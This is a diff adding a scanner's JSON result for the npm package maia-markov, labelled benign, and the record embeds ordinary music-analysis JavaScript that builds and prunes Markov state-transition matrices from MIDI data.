@@ -1,0 +1,1462 @@
+{
+  "package_name": "maia-markov",
+  "package_version": "0.1.12",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:15:56.988730",
+  "status": "success",
+  "selected_files_count": 12,
+  "selected_files": [
+    "package/package.json",
+    "package/es6/index.js",
+    "package/es6/Analyzer.js",
+    "package/es6/Edge.js",
+    "package/es6/Generator.js",
+    "package/es6/Graph.js",
+    "package/es6/Heap.js",
+    "package/es6/KernImport.js",
+    "package/es6/KeyValuePair.js",
+    "package/es6/MelodyExtractor.js",
+    "package/es6/MidiExport.js",
+    "package/es6/MidiImport.js"
+  ],
+  "is_malicious": false,
+  "total_files": 12,
+  "malicious_files": 0,
+  "total_slices": 3,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/Analyzer.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "Analyzer_slice_1",
+          "code_snippet": "// Imports\n// import 'maia-util'\n// import mu from 'maia-util'\nconst fs = require('fs')\nconst path = require('path')\nconst mu = require('maia-util')\n// const uu = require('uuid')\n\n// Constructor for Analyzer object\nexport default function Analyzer(){\n  // Workaround for JS context peculiarities.\n  // var self = this;\n  // Possible to return something.\n  // return sth;\n}\n// Methods for Analyzer object\nAnalyzer.prototype = {\n  constructor: Analyzer,\n\n  comp_obj2beat_mnn_states: function(\n    compObj, onAndOff = true, idxOn = 0, idxMNN = 1, idxDur = 3\n  ){\n    // Tom Collins 11/1/2015.\n    // This function converts a compObj variable to an array consisting of\n    // json variables. Each json variable contains state and context information\n    // for a segment of the input compObj variable. This can then be analysed\n    // (by another function) for possible continuations between states in one or\n    // more pieces.\n\n    var out_array = [];\n    // console.log('compObj:');\n    // console.log(compObj);\n    if (compObj.timeSignatures.length > 1){\n      console.log(\"More than one time signature in this piece.\");\n      console.log(\"Might not be the best idea to analyse with this function.\");\n      console.log(\"Stopping analysis for this piece.\");\n      return out_array;\n    }\n    else {\n      var D = mu.comp_obj2note_point_set(compObj);\n      var segE = mu.segment(D, onAndOff, idxOn, idxDur);\n\n      // Iterate over segE, converting the ontime of each segment to a beat\n      // number and extracting the MIDI note numbers.\n      for (let i = 0; i < segE.length; i++){\n        var bar_beat = mu.bar_and_beat_number_of_ontime(\n          segE[i].ontime, compObj.timeSignatures\n        );\n        // This is beat of the bar in crotchet beats rounded to 5 decimal places.\n        var beat_round = Math.round(bar_beat[1]*100000)/100000;\n        var MNN = new Array(segE[i].points.length)\n        for (let j = 0; j < segE[i].points.length; j++){\n          MNN[j] = segE[i].points[j][idxMNN];\n        }\n        // Sort the MNN_rel entries and retain only the unique members.\n        var unqAndIdx = mu.unique_rows(MNN.map(function(m){ return [m] }))\n        var unqMNN = unqAndIdx[0].map(function(arr){ return arr[0] })\n        // Want to switch the mapping from this [[0, 2], [1], [3]] to [0, 1, 0, 2]\n        var mapSwitch = new Array(MNN.length)\n        unqAndIdx[1].map(function(arr, idx){\n          arr.map(function(el){\n            mapSwitch[el] = idx\n          })\n        })\n        // var unqMNN = mu.get_unique(\n        //   MNN_rel.sort(function(a, b) { return a - b; })\n        // );\n\n        // Tuplets in scores can cause rounding errors when states are created, so\n        // check for very small time differences between consecutive states, and\n        // ignore a state if it is followed really soon after by another.\n        // *********************************************************************\n        // 20200218. Also now getting rid of rest states here. They add noise. *\n        // *********************************************************************\n        if (segE[i].offtime - segE[i].ontime >= .00002 && unqMNN.length > 0){\n          out_array.push({\n            \"beat_MNN_state\": [beat_round, unqMNN],\n            \"context\": {\n              \"piece_id\": compObj.id,\n              \"orig_points\": segE[i].points,\n              \"orig_ontime\": segE[i].ontime, // Useful for identifying phrase boundaries.\n              \"map_into_state\": mapSwitch\n            }\n          });\n        }\n        // else{\n        //   console.log('A state was thrown out because of being a rest or ' +\n        //   ' followed really soon after by another.');\n        //   console.log('segE[i]:');\n        //   console.log(segE[i]);\n        //   console.log('segE[i + 1]:');\n        //   console.log(segE[i + 1]);\n        // }\n      }\n      return out_array;\n    }\n  },\n\n  comp_obj2beat_rel_mnn_states: function(\n    compObj, onAndOff = true, idxOn = 0, idxMNN = 1, idxDur = 3\n  ){\n    // Tom Collins 11/1/2015.\n    // This function converts a compObj variable to an array consisting of\n    // json variables. Each json variable contains state and context information\n    // for a segment of the input compObj variable. This can then be analysed\n    // (by another function) for possible continuations between states in one or\n    // more pieces.\n\n    var idxMNN = 1;\n    var out_array = [];\n    if (compObj.timeSignatures.length > 1){\n      console.log(\"More than one time signature in this piece.\");\n      console.log(\"Might not be the best idea to analyse with this function.\");\n      console.log(\"Stopping analysis for this piece.\");\n      return out_array;\n    }\n    else{\n      var D = mu.comp_obj2note_point_set(compObj);\n      var segD = mu.segment(D, onAndOff, idxOn, idxDur);\n\n      // console.log(\"compObj.keySignatures[0]:\", compObj.keySignatures[0])\n      var fifth_steps = compObj.keySignatures[0].fifthSteps;\n      var mode = compObj.keySignatures[0].mode;\n      var trans_pair_and_c_point_set = this.centre_point_set(\n        [fifth_steps, mode], mu.copy_point_set(D)\n      );\n      var trans_pair = trans_pair_and_c_point_set[0];\n      // console.log('trans_pair:');\n      // console.log(trans_pair);\n      var E = trans_pair_and_c_point_set[1];\n      var segE = mu.segment(E, onAndOff, idxOn, idxDur);\n      // console.log('segments:');\n      // console.log(segE);\n\n      // Iterate over segE, converting the ontime of each segment to a beat\n      // number and extracting the relative MIDI note numbers.\n      for (let i = 0; i < segE.length; i++){\n        var bar_beat = mu.bar_and_beat_number_of_ontime(\n          segE[i].ontime, compObj.timeSignatures\n        );\n        // This is beat of the bar in crotchet beats rounded to 5 decimal places.\n        var beat_round = Math.round(bar_beat[1]*100000)/100000;\n        var rel_MNN = new Array(segE[i].points.length)\n        for (let j = 0; j < segE[i].points.length; j++){\n          rel_MNN[j] = segE[i].points[j][idxMNN];\n        }\n        // Sort the rel_MNN entries and retain only the unique members.\n        var unqAndIdx = mu.unique_rows(rel_MNN.map(function(m){ return [m] }))\n        var unqRelMNN = unqAndIdx[0].map(function(arr){ return arr[0] })\n        // Want to switch the mapping from this [[0, 2], [1], [3]] to [0, 1, 0, 2]\n        var mapSwitch = new Array(rel_MNN.length)\n        unqAndIdx[1].map(function(arr, idx){\n          arr.map(function(el){\n            mapSwitch[el] = idx\n          })\n        })\n        // var unqRelMNN = mu.get_unique(\n        //   rel_MNN.sort(function(a, b) { return a - b; })\n        // );\n\n        // Tuplets in scores can cause rounding errors when states are created, so\n        // check for very small time differences between consecutive states, and\n        // ignore a state if it is followed really soon after by another.\n        // ***************************************************\n        // 20200218. Get rid of rest states. They add noise. *\n        // ***************************************************\n        if (segE[i].offtime - segE[i].ontime >= .00002 && unqRelMNN.length > 0){\n          out_array.push({\n            \"beat_rel_MNN_state\": [beat_round, unqRelMNN],\n            \"context\": {\n              \"piece_id\": compObj.id,\n              \"orig_points\": segD[i].points,\n              \"orig_ontime\": segD[i].ontime, // Useful for identifying phrase boundaries.\n              \"map_into_state\": mapSwitch,\n              \"tonic_pitch_closest\": trans_pair,\n              \"fifth_steps_mode\": [fifth_steps, mode]\n            }\n          });\n        }\n        // else {\n        //   console.log('A state was thrown out because of being followed really' +\n        //   ' soon after by another.');\n        //   console.log('segE[i]:');\n        //   console.log(segE[i]);\n        //   console.log('segE[i + 1]:');\n        //   console.log(segE[i + 1]);\n        // }\n      }\n      return out_array;\n    }\n  },\n\n  comp_obj2beat_rel_sq_mnn_states: function(\n    compObj, onAndOff = true, squashRange = 12, idxOn = 0, idxMNN = 1, idxDur = 3\n  ){\n    // Tom Collins 26/2/2020.\n    // This function converts a compObj variable to an array consisting of\n    // json variables. Each json variable contains state and context information\n    // for a segment of the input compObj variable. This can then be analysed\n    // (by another function) for possible continuations between states in one or\n    // more pieces.\n\n    var idxMNN = 1;\n    var out_array = [];\n    if (compObj.timeSignatures.length > 1){\n      console.log(\"More than one time signature in this piece.\");\n      console.log(\"Might not be the best idea to analyse with this function.\");\n      console.log(\"Stopping analysis for this piece.\");\n      return out_array;\n    }\n    else{\n      var D = mu.comp_obj2note_point_set(compObj);\n      var segD = mu.segment(D, onAndOff, idxOn, idxDur);\n\n      // console.log(\"compObj.keySignatures[0]:\", compObj.keySignatures[0])\n      var fifth_steps = compObj.keySignatures[0].fifthSteps;\n      var mode = compObj.keySignatures[0].mode;\n      var trans_pair_and_c_point_set = this.centre_point_set(\n        [fifth_steps, mode], mu.copy_point_set(D)\n      );\n      var trans_pair = trans_pair_and_c_point_set[0];\n      // console.log('trans_pair:');\n      // console.log(trans_pair);\n      var E = trans_pair_and_c_point_set[1];\n      var segE = mu.segment(E, onAndOff, idxOn, idxDur);\n      // console.log('segments:');\n      // console.log(segE);\n\n      // Iterate over segE, converting the ontime of each segment to a beat\n      // number and extracting the relative MIDI note numbers.\n      for (let i = 0; i < segE.length; i++){\n        var bar_beat = mu.bar_and_beat_number_of_ontime(\n          segE[i].ontime, compObj.timeSignatures\n        );\n        // This is beat of the bar in crotchet beats rounded to 5 decimal places.\n        var beat_round = Math.round(bar_beat[1]*100000)/100000;\n        var rel_sq_MNN = new Array(segE[i].points.length);\n        for (let j = 0; j < segE[i].points.length; j++){\n          // console.log(\"j:\", j)\n          //*************\n          // Squashing! *\n          //*************\n          let m = segE[i].points[j][idxMNN]\n          // console.log(\"m:\", m)\n          while (m > squashRange || m < -squashRange){\n            if (m > squashRange){\n              m -= squashRange\n            }\n            else {\n              m += squashRange\n            }\n          }\n          rel_sq_MNN[j] = m;\n        }\n        // Sort the rel_sq_MNN entries and retain only the unique members.\n        var unqAndIdx = mu.unique_rows(rel_sq_MNN.map(function(m){ return [m] }))\n        var unq_rel_sq_MNN = unqAndIdx[0].map(function(arr){ return arr[0] })\n        // Want to switch the mapping from this [[0, 2], [1], [3]] to [0, 1, 0, 2]\n        var mapSwitch = new Array(rel_sq_MNN.length)\n        unqAndIdx[1].map(function(arr, idx){\n          arr.map(function(el){\n            mapSwitch[el] = idx\n          })\n        })\n        // var unq_rel_sq_MNN = mu.get_unique(\n        //   unq_rel_sq_MNN.sort(function(a, b) { return a - b; })\n        // );\n\n        // Tuplets in scores can cause rounding errors when states are created, so\n        // check for very small time differences between consecutive states, and\n        // ignore a state if it is followed really soon after by another.\n        // ***************************************************\n        // 20200218. Get rid of rest states. They add noise. *\n        // ***************************************************\n        if (segE[i].offtime - segE[i].ontime >= .00002 && rel_sq_MNN.length > 0){\n          out_array.push({\n            \"beat_rel_sq_MNN_state\": [beat_round, unq_rel_sq_MNN],\n            \"context\": {\n              \"piece_id\": compObj.id,\n              \"orig_points\": segD[i].points,\n              \"orig_ontime\": segD[i].ontime, // Useful for identifying phrase boundaries.\n              \"map_into_state\": mapSwitch,\n              \"tonic_pitch_closest\": trans_pair,\n              \"fifth_steps_mode\": [fifth_steps, mode]\n            }\n          });\n        }\n        // else {\n        //   console.log('A state was thrown out because of being followed really' +\n        //   ' soon after by another.');\n        //   console.log('segE[i]:');\n        //   console.log(segE[i]);\n        //   console.log('segE[i + 1]:');\n        //   console.log(segE[i + 1]);\n        // }\n      }\n      return out_array;\n    }\n  },\n\n  lyrics_obj2lyrics_states: function(lyricsObj){\n    // Tom Collins 11/1/2015.\n    // This function converts a lyricsObj variable to an array consisting of\n    // json variables. Each json variable contains state and context information\n    // for a segment of the input lyricsObj variable. This can then be analysed\n    // (by another function) for possible continuations between states in one or\n    // more pieces.\n\n    var out_array = []\n    lyricsObj.lyricsArr.forEach(function(line, idx){\n      line.forEach(function(word, jdx){\n        let state = []\n        state.push(word)\n        if (jdx < line.length - 1){\n          state.push(line[jdx + 1])\n        }\n        else {\n          if (idx < lyricsObj.lyricsArr.length - 1){\n            state.push(lyricsObj.lyricsArr[idx + 1][0])\n          }\n        }\n        if (state.length == 2){\n          out_array.push({\n            \"lyrics_state\": state,\n            \"context\": {\n              \"piece_id\": lyricsObj.id,\n              \"index_in_line\": jdx\n            }\n          })\n        }\n      })\n    })\n    return out_array\n  },\n\n  construct_prune_write_stm: function(_comps, _param){\n    let anStm = this.construct_stm(_comps, _param)\n    console.log(\"anStm.length:\", anStm.length)\n    anStm = this.prune_stm(anStm, _param)\n    console.log(\"pruned anStm.length:\", anStm.length)\n    if (anStm.length > 0){\n      // console.log(\"anStm[0].beat_mnn_state:\", anStm[0].beat_mnn_state);\n      // console.log(\"anStm.slice(0, 1):\", anStm.slice(0, 1));\n      fs.writeFileSync(\n        path.join(_param.outPath, _param.filename + \"_stm.js\"),\n        JSON.stringify(anStm)//, null, 2)\n      )\n      if (_param.stmTimer){\n        clearTimeout(_param.stmTimer)\n      }\n      return anStm\n    }\n    // Else, return undefined.\n  },\n\n  construct_stm: function(compObjs, param){\n    // Tom Collins 27/1/2015.\n    // This function takes an array of json_score variables as input, and\n    // constructs an array known as a state transition matrix. In reality, it is\n    // an array not a matrix: an array of objects where each object contains a\n    // beat_MNN_state property and a continuations property. The beat_MNN_state\n    // property value is an array, something like\n    // [1, [42, 60]], which means a musical event/segment that begins on beat 1\n    // of the bar and consists of two MIDI note numbers, 42 and 60. The\n    // continuations property value is an array consisting of state-context\n    // pairs: it is all the events/segments that follow on from [1, [42, 60]],\n    // say, in the json_score variables.\n\n    const stateType = param.stateType\n    const onAndOff = param.onAndOff\n    const squashRange = param.squashRangeMidi\n\n    // Could check that each of the compObjs have just one time signature, and\n    // that they are all equal to one another...\n\n    var nscr = compObjs.length;\n    var state_context_pairs = [];\n    for (let iscr = 0; iscr < nscr; iscr++){\n      switch (stateType){\n        case \"beat_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_mnn_states(\n          compObjs[iscr],\n          onAndOff\n        );\n        break;\n        case \"beat_rel_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_rel_mnn_states(\n          compObjs[iscr],\n          onAndOff\n        );\n        break;\n        case \"beat_rel_sq_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_rel_sq_mnn_states(\n          compObjs[iscr],\n          onAndOff,\n          squashRange\n        );\n        break;\n        case \"lyrics_state\":\n        state_context_pairs[iscr] = this.lyrics_obj2lyrics_states(compObjs[iscr]);\n        break;\n        default:\n        console.log(\"SHOULD NOT GET HERE!\")\n      }\n      //if (iscr == 0){\n      //  console.log('state_context_pairs[iscr]:', state_context_pairs[iscr]);\n      //}\n    }\n\n    var stm = [];\n    for (let iscr = 0; iscr < nscr; iscr++){\n      for (let jstate = 0; jstate < state_context_pairs[iscr].length - 1; jstate++){\n        // console.log('Curr state:');\n        // console.log(state_context_pairs[iscr][jstate][\"beat_MNN_state\"]);\n        var rel_idx = mu.array_object_index_of_array(\n          stm, state_context_pairs[iscr][jstate][stateType], stateType\n        );\n        if (rel_idx >= 0){\n          // The current state already appears in the stm. Push its continuation\n          // to the array of continuations for this state.\n          stm[rel_idx][\"continuations\"].push(state_context_pairs[iscr][jstate + 1]);\n        }\n        else {\n          // The current state has not appeared in the stm before. Push it and\n          // its first continuation observed here to the stm.\n          var newObj = {}\n          newObj[stateType] = state_context_pairs[iscr][jstate][stateType]\n          newObj.continuations = [state_context_pairs[iscr][jstate + 1]]\n          stm.push(newObj);\n        }\n      }\n      // console.log('Completed processing composition ' + iscr);\n    }\n    return stm;\n  },\n\n  prune_stm: function(stm, param){\n    const self = this\n    const stateType = param.stateType\n    const nosConsecutives = param.nosConsecutives\n\n    // Identify dead-ends.\n    stm.map(function(stateConts, idx){\n      if (idx % 500 == 0){\n        console.log(\"Pruning at index \" + idx + \" of \" + stm.length + \".\")\n      }\n      stateConts.deadEnd = self.prune_helper(stateConts, stm, stateType, nosConsecutives)\n    })\n    // console.log(\"Dead-ends identified, stm.length:\", stm.length)\n    // Remove them and associated continuations.\n    for (let i = stm.length - 1; i >= 0; i--){\n      if (i % 500 == 0){\n        console.log(\"Checking removal need at index \" + i + \" of \" + stm.length + \".\")\n      }\n      if (stm[i].deadEnd){\n        stm = self.prune_remover(stm[i][stateType], stm, stateType)\n      }\n    }\n    // console.log(\"Dead-ends and associated continuations removed, stm.length:\", stm.length)\n    // Remove any states whose continuations array is now of length zero.\n    for (let i = stm.length - 1; i >= 0; i--){\n      if (i % 500 == 0){\n        console.log(\"Checking continuations length at \" + i + \" of \" + stm.length + \".\")\n      }\n      if (stm[i].continuations.length == 0){\n        stm.splice(i, 1)\n      }\n    }\n    // Delete deadEnd properties, since we're done with them now.\n    stm = stm.map(function(stateConts){\n      delete stateConts.deadEnd\n      return stateConts\n    })\n    return stm\n  },\n\n  prune_helper: function(stateConts, stm, stateType, nosConsecutives){\n    let pruneAns = [] // Defining as an array to enforce pass by reference.\n    this.prune_helper_2(stateConts, stm, stateType, nosConsecutives, pruneAns)\n    // if (pruneAns.length > 1){\n    //   console.log(\"NOT SURE THIS SHOULD GROW TO LENGTH 2+!\")\n    // }\n    return pruneAns[0]\n  },\n\n  prune_helper_2: function(stateConts, stm, stateType, nosConsecutives, pruneAns, consecCount = 0){\n    const self = this\n    // console.log(\"consecCount:\", consecCount)\n    if (consecCount == nosConsecutives){\n      // We reached the limit of how far we can go from the original state without\n      // encountering at least one other different piece_id, so the original state\n      // is considered a dead end for this value of nosConsecutives.\n      pruneAns.push(true)\n      return\n    }\n    const unqIds = mu.get_unique(\n      stateConts[\"continuations\"].map(function(c){ return c.context.piece_id })\n    )\n    // console.log(\"unqIds:\", unqIds)\n    if (unqIds.length > 1){\n      // At least one other different piece_id, so we're good.\n      pruneAns.push(false)\n      return\n    }\n    stateConts[\"continuations\"].forEach(function(c){\n      // Keep looking for each continuation of this state.\n      // console.log(\"c[stateType]:\", c[stateType])\n      const relIdx = mu.array_object_index_of_array(stm, c[stateType], stateType)\n      // console.log(\"relIdx:\", relIdx)\n      if (relIdx >= 0){\n        self.prune_helper_2(stm[relIdx], stm, stateType, nosConsecutives, pruneAns, consecCount + 1)\n      }\n      // If we get here, then a terminal state must have been encountered.\n      // console.log(\"Terminal state encountered!\")\n    })\n  },\n\n  prune_remover: function(state, stm, stateType){\n    // Remove all occurrences of the dead-end state from continuations.\n    const relIdx = mu.array_object_index_of_array(stm, state, stateType)\n    stm = stm.map(function(sc){\n      sc.continuations = sc.continuations.filter(function(c){\n        return !c[stateType].equals(state)\n      })\n      return sc\n    })\n    // Remove the state itself from the stm.\n    stm.splice(relIdx, 1)\n    return stm\n  },\n\n  note_point_set2comp_obj: function(\n    ps, timeSigs = [{\"barNo\": 1, \"topNo\": 4, \"bottomNo\": 4, \"ontime\": 0}],\n    isPerc = false, f = mu.farey(4),\n    onIdx = 0, mnnIdx = 1, durIdx = 3, chanIdx = 4, velIdx = 5\n  ){\n    var comp = {};\n    var notes = [];\n    var maxInd;\n    // Split up MIDI notes by channel number.\n    var unqChan = [];\n    var psByChan = [];\n    ps.map(function(n){\n      if (unqChan.indexOf(n[chanIdx]) === -1){\n        unqChan.push(n[chanIdx]);\n        psByChan[n[chanIdx]] = [n];\n      }\n      else {\n        psByChan[n[chanIdx]].push(n);\n      }\n      return;\n    });\n    // console.log(\"unqChan:\", unqChan);\n    // console.log(\"psByChan:\", psByChan);\n    var numTracks = 0;\n    comp[\"layer\"] = [];\n    unqChan.map(function(track, ind){\n      numTracks++;\n      comp.layer.push({ staffNo: track });\n      return;\n    });\n    // console.log(\"comp.layer:\", comp.layer);\n    // console.log(\"numTracks:\", numTracks);\n    if (numTracks === 0){\n      console.log(\"No tracks found in this MIDI file.\");\n      return;\n    }\n\n    comp[\"layer\"] = comp[\"layer\"].map(function(track, layerNum){\n      var layer = {};\n      if (track == 10){\n        layer[\"idInstrument\"] = \"edm_drum_kit\"\n      }\n      else {\n        layer[\"idInstrument\"] = \"acoustic_grand_piano\"\n      }\n      // layer[\"idInstrument\"] = assign_instrument_basic(track)\n      // This won\"t work because we\"re no longer importing from MIDI.\n      // console.log(\"track.instrumentNumber:\", track.instrumentNumber);\n      // layer[\"idInstrument\"] = an.assign_instrument_basic(track.instrumentNumber)\n      layer[\"staffNo\"] = layerNum\n      layer[\"timestampLastUsed\"] = \"\"\n      layer[\"vexflow\"] = { \"name\": \"\", \"abbreviation\": \"\", \"staffOrderNo\": layerNum }\n      // This won't work because we're no longer importing from MIDI.\n      // layer[\"vexflow\"] = { \"name\": track.name || \"\", \"abbreviation\": \"\", \"staffOrderNo\": layerNum }\n      if (psByChan[track.staffNo] !== undefined){\n        // Get the track.notes and quantise them.\n        var ps2 = psByChan[track.staffNo].filter(function(note){\n          // Get rid of quiet notes.\n          return note[velIdx] > 0.05;\n        })\n        // .map(function(note){\n        //   return [\n        //     note[0],\n        //     note[1],\n        //     note[2],\n        //     note[3],\n        //     note[4]\n        //   ];\n        // })\n        .filter(function(p){ // Gets rid of really low/high notes.\n          return p[mnnIdx] >= 21 && p[mnnIdx] <= 108;\n        });\n        // console.log(\"unquantised ps2.slice(0, 3):\", ps2.slice(0, 3))\n        if (f !== null){\n          ps2 = mu.farey_quantise(ps2, f, [onIdx, durIdx]);\n          ps2 = mu.unique_rows(ps2, true)[0]\n        }\n        // console.log(\"quantised ps2.slice(0, 3):\", ps2.slice(0, 3))\n        notes.push(...ps2.map(function(p){\n          var compNote = mu.timelapse_object()\n          // var compNote = {}\n          // compNote[\"id\"] = uu()\n          // but it has implications in terms of file size.\n          compNote[\"ontime\"] = p[onIdx]\n          if (p[durIdx] > 8){\n            compNote[\"duration\"] = 8;\n            // console.log(\"Long duration corrected.\")\n          }\n          else {\n            compNote[\"duration\"] = p[durIdx]\n          }\n          compNote[\"offtime\"] = compNote.ontime + compNote.duration\n          var barBeat = mu.bar_and_beat_number_of_ontime(compNote.ontime, timeSigs)\n          compNote[\"barOn\"] = barBeat[0]\n          compNote[\"beatOn\"] = barBeat[1]\n          barBeat = mu.bar_and_beat_number_of_ontime(compNote.offtime, timeSigs)\n          compNote[\"barOff\"] = barBeat[0]\n          compNote[\"beatOff\"] = barBeat[1]\n          // compNote[\"pitch\"] = note.name\n          compNote[\"MNN\"] = p[mnnIdx]\n          // compNote[\"MPN\"] = 0\n          compNote[\"staffNo\"] = p[chanIdx]\n          compNote[\"tonejs\"] = {\n            \"volume\": p[velIdx] // Math.round(100*p[velIdx]/127)/100\n          }\n          compNote[\"voiceNo\"] = 0\n          // compNote[\"isPerc\"] = true\n          return compNote\n        }))\n        // console.log(\"notes.slice(0, 10):\", notes.slice(0, 10));\n      }\n      return layer\n    })\n    // console.log(\"notes.length:\", notes.length);\n\n    var keySig\n    if (!isPerc){\n      keySig = mu.fifth_steps_mode(ps, mu.krumhansl_and_kessler_key_profiles)\n    }\n    else {\n      keySig = [\"C major\", 1, 0, 0]\n    }\n    comp[\"keySignatures\"] = [{\n      \"barNo\": 1,\n      \"keyName\": keySig[0],\n      \"fifthSteps\": keySig[2],\n      \"mode\": keySig[3],\n      \"ontime\": 0\n    }]\n    // console.log(\"keySig:\", keySig);\n    comp[\"timeSignatures\"] = timeSigs\n    // Guess note names.\n    notes.forEach(function (note) {\n      note[\"MPN\"] = mu.guess_morphetic(note.MNN, keySig[2], keySig[3])\n      note[\"pitch\"] = mu.midi_note_morphetic_pair2pitch_and_octave(note.MNN, note.MPN)\n    })\n    comp[\"notes\"] = notes.sort(mu.sort_points_asc);\n    // comp[\"sequencing\"] = [{\"ontime\": 0, \"offtime\": 16, \"repetitionNo\": 1}]\n    comp[\"tempi\"] = [{\"barNo\": 1, \"ontime\": 0, \"bpm\": 120, \"tempo\": \"\"}]\n    // comp[\"tempi\"] = [{\"barNo\": 1, \"ontime\": 0, \"bpm\": midi.header.bpm, \"tempo\": \"\"}]\n    return comp;\n  },\n\n  centre_point_set:function (\n    fifth_steps_mode, point_set, idxMNN = 1, idxMPN = 2\n  ){\n    // Tom Collins 26/1/2015.\n    // Translates the point set so that the tonic pitch class closest to the mean\n    // MIDI note number is represented by the pair [0, 0].\n\n    var MNN_MPN_pair = this.fifth_steps_mode2MNN_MPN(fifth_steps_mode);\n    // console.log(\"MNN_MPN_pair:\", MNN_MPN_pair)\n\n    // Find the MIDI note number of the tonic pitch class closest to the mean\n    // MIDI note number of the piece. Start by finding the mean MNN.\n    var MNNs = [];\n    for (i = 0; i < point_set.length; i++){\n      MNNs.push(point_set[i][1]);\n    }\n    var MNN_mu = mu.mean(MNNs);\n    // console.log('Mean MNN:');\n    // console.log(MNN_mu);\n\n    // Get the MNNs for all the tonic pitch classes.\n    var MNN_tonal=[];\n    for(var i = MNN_MPN_pair[0] - 60; i <= MNN_MPN_pair[0] + 72; i = i + 12){\n      MNN_tonal[MNN_tonal.length] = i;\n    }\n\n    // Now find the MNN of the tonic pitch class closest to the mean MNN.\n    var dist = [];\n    var n_tonal = MNN_tonal.length;\n    for (i = 0; i < n_tonal; i++){\n      dist[i] = Math.abs(MNN_tonal[i] - MNN_mu);\n    }\n    var min_stuff = mu.min_argmin(dist);\n    var trans_pair = [\n      MNN_MPN_pair[0] + 12*(min_stuff[1] - 5),\n      MNN_MPN_pair[1] + 7*(min_stuff[1] - 5)\n    ];\n\n    for (i = 0; i < point_set.length; i++){\n      var new_MNN = point_set[i][idxMNN] - trans_pair[0];\n      var new_MPN = point_set[i][idxMPN] - trans_pair[1];\n      point_set[i].splice(idxMNN, 1, new_MNN);\n      point_set[i].splice(idxMPN, 1, new_MPN);\n    }\n    return [trans_pair, point_set];\n  },\n\n  construct_prune_write_initial: function(_comps, _stm, _param){\n    let initialDistbn = this.construct_initial(_comps, _param)\n    initialDistbn = this.prune_initial(initialDistbn, _stm, _param)\n    if (initialDistbn.length > 0){\n      fs.writeFileSync(\n        path.join(_param.outPath, _param.filename + \"_initial.js\"),\n        JSON.stringify(initialDistbn)//, null, 2)\n      )\n      if (_param.initialTimer){\n        clearTimeout(_param.initialTimer)\n      }\n      return initialDistbn\n    }\n    // Else, return undefined.\n  },\n\n  construct_initial: function(compObjs, param){\n    const stateType = param.stateType\n    const onAndOff = param.onAndOff\n    const squashRange = param.squashRangeMidi\n    const phraseBoundaryPropName = param.phraseBoundaryPropName\n\n    // Could check that each of the compObjs have just one time signature, and\n    // that they are all equal to one another...\n\n    var nscr = compObjs.length;\n    var state_context_pairs = [];\n    for (let iscr = 0; iscr < nscr; iscr++){\n      switch (stateType){\n        case \"beat_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_mnn_states(\n          compObjs[iscr],\n          onAndOff\n        );\n        break;\n        case \"beat_rel_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_rel_mnn_states(\n          compObjs[iscr],\n          onAndOff\n        );\n        break;\n        case \"beat_rel_sq_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_rel_sq_mnn_states(\n          compObjs[iscr],\n          onAndOff,\n          squashRange\n        );\n        break;\n        case \"lyrics_state\":\n        state_context_pairs[iscr] = this.lyrics_obj2lyrics_states(compObjs[iscr]);\n        break;\n        default:\n        console.log(\"SHOULD NOT GET HERE!\")\n      }\n      //if (iscr == 0){\n      //  console.log('state_context_pairs[iscr]:', state_context_pairs[iscr]);\n      //}\n    }\n\n    var initial = []\n    if (stateType == \"lyrics_state\"){\n      for (let iscr = 0; iscr < nscr; iscr++){\n        for (let jstate = 0; jstate < state_context_pairs[iscr].length - 1; jstate++){\n          // console.log('Curr state:');\n          // console.log(state_context_pairs[iscr][jstate][\"beat_MNN_state\"]);\n          let scPair = state_context_pairs[iscr][jstate]\n          if (scPair.context.index_in_line == 0){\n            initial.push(scPair)\n          }\n        }\n      }\n    }\n    else {\n      for (let iscr = 0; iscr < nscr; iscr++){\n        for (let jstate = 0; jstate < state_context_pairs[iscr].length - 1; jstate++){\n          // console.log('Curr state:');\n          // console.log(state_context_pairs[iscr][jstate][\"beat_MNN_state\"]);\n          let scPair = state_context_pairs[iscr][jstate]\n          if (phraseBoundaryPropName){\n            // Is there a phrase boundary ontime sufficiently close to the\n            // ontime of this segment?\n            if (\n              compObjs[iscr][phraseBoundaryPropName].find(function(o){\n                return Math.abs(o - scPair[\"context\"][\"orig_ontime\"]) < .00002\n              })\n            ){\n              // Yes\n              initial.push(scPair)\n            }\n          }\n          else {\n            if (scPair[stateType][0] == 1){\n              initial.push(scPair)\n            }\n          }\n        }\n      }\n    }\n    return initial;\n  },\n\n  construct_scl: function(compObjs, param){\n    const stateType = param.stateType\n    const onAndOff = param.onAndOff\n    const squashRange = param.squashRangeMidi\n    const phraseBoundaryPropName = param.phraseBoundaryPropName\n\n    // Could check that each of the compObjs have just one time signature, and\n    // that they are all equal to one another...\n\n    const nscr = compObjs.length\n    const state_context_pairs = []\n    for (let iscr = 0; iscr < nscr; iscr++){\n      switch (stateType){\n        case \"beat_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_mnn_states(\n          compObjs[iscr],\n          onAndOff\n        );\n        break;\n        case \"beat_rel_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_rel_mnn_states(\n          compObjs[iscr],\n          onAndOff\n        );\n        break;\n        case \"beat_rel_sq_MNN_state\":\n        state_context_pairs[iscr] = this.comp_obj2beat_rel_sq_mnn_states(\n          compObjs[iscr],\n          onAndOff,\n          squashRange\n        );\n        break;\n        case \"lyrics_state\":\n        